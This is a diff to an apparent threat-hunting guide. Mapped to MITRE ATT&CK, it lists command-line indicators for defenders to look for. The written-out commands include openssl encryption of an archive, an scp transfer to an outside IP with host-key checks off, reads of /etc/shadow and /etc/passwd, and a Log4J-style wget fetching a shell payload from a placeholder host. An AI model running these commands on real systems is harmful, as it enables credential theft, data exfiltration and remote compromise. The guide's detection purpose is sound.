@@ -1,3 +1,16 @@
+# Archive Data with OpenSSL [T1560.001](https://attack.mitre.org/techniques/T1560/001/)
+1. Look for use of openssl to encrypt data before tunneling takes place with ```openssl enc -aes-256-cbc -salt -pass pass:test123 -in /home/ransom_test/upload.tar.gz -out /home/ransom_test/encrypted_upload.tar.gz```. 
+
+# SSH Tunneling [T1572](https://attack.mitre.org/techniques/T1572/)
+1. Look for tunneling with command line similar to ```scp -o StrictHostKeyChecking=no -o BatchMode=yes ssh.tar.gz vagrant@198.51.100.2:/tmp```. 
+2. Look for use of openssl to encrypt data before tunneling takes place with ```openssl enc -aes-256-cbc -salt -pass pass:test123 -in /home/ransom_test/upload.tar.gz -out /home/ransom_test/encrypted_upload.tar.gz```. 
+
+# Find Dump Credential Activity [T1003.008](https://attack.mitre.org/techniques/T1003/008/)
+1. Look for command line execution with target files of ```/etc/shadow``` and ```/etc/passwd```. 
+
+# Find JNDI Exploitation/Log4J [T1190](https://attack.mitre.org/techniques/T1190/)
+1. Look for log traffic with ```wget http[:]//awk3hd9encccccA_diesla[:]8000/get_shell_payload``` and ```java log4j_execution.java wget http://awk3hd9encccccA_diesla:8000/get_shell_payload``` like attempts. It should contain Java within the command. 
+
 # Find Command Line Execution [T1059.004](https://attack.mitre.org/techniques/T1059/004/)
 1. Look within the user home directories for ```.bash_history```. 
 2. Look for aliasing within ```.bashrc``` in the user home directory. 
